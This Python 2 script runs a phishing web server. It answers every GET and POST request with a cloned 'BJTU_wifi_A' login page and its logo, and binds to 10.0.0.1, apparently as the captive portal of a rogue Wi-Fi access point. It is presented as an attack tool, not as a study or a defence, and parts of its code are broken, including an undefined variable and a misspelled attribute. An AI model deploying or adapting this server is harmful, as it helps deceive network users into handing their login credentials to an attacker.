from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import SimpleHTTPServer
import os

PHISING_PAGE = 'BJTU_wifi_A'


class TestHTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):

        if self.path == '/':
            self.path = "%s/%s" % (PHISING_PAGE, 'index.html')

        if not os.path.isfile(self.path):
            Content_type = ''
            if self.path.endswith('html') or self.path.endswith('htm'):
                self.path = "%s/%s" % (PHISING_PAGE, 'index.html')
                Content_type = 'text/html'
            elif self.path.endswith('bjtu.jpg'):
                self.path = "%s/%s" % (PHISING_PAGE, 'file/bjtu.jpg')
                Content_type = 'image/jpeg'
            else:
                self.path = "%s/%s" % (PHISING_PAGE, 'index.html')

        f = open(self.path)

        self.protocal_version = "HTTP/1.1"

        self.send_response(200)
        self.send_header('Content-type', Content_type)

        self.end_headers()
        self.wfile.write(f.read())
        return

        # else:
        #     SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        # return

    def do_POST(self):
        if self.path == '/':
            self.path = "%s/%s" % (PHISING_PAGE, 'index.html')

        if not os.path.isfile(self.path):
            Content_type = ''
            if self.path.endswith('html') or self.path.endswith('htm'):
                self.path = "%s/%s" % (PHISING_PAGE, 'index.html')
                Content_type = 'text/html'
            elif self.path.endswith('bjtu.jpg'):
                self.path = "%s/%s" % (PHISING_PAGE, 'file/bjtu.jpg')
                Content_type = 'image/jpeg'

        f = open(self.path)

        self.protocal_version = "HTTP/1.1"

        self.send_response(200)
        self.send_header('Content-type', Content_type)

        self.end_headers()
        self.wfile.write(f.read())
        return

        # else:
        #     SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        # return


def start_server(port):
    http_server = HTTPServer(('10.0.0.1', int(port)), TestHTTPHandler)
    http_server.serve_forever()


if __name__ == '__main__':
    PORT = raw_input('PORT > ')
    # start_server(PORT)
    webserver = Thread(target=start_server, args=[PORT])
    # webserver.daemon = True
    webserver.start()
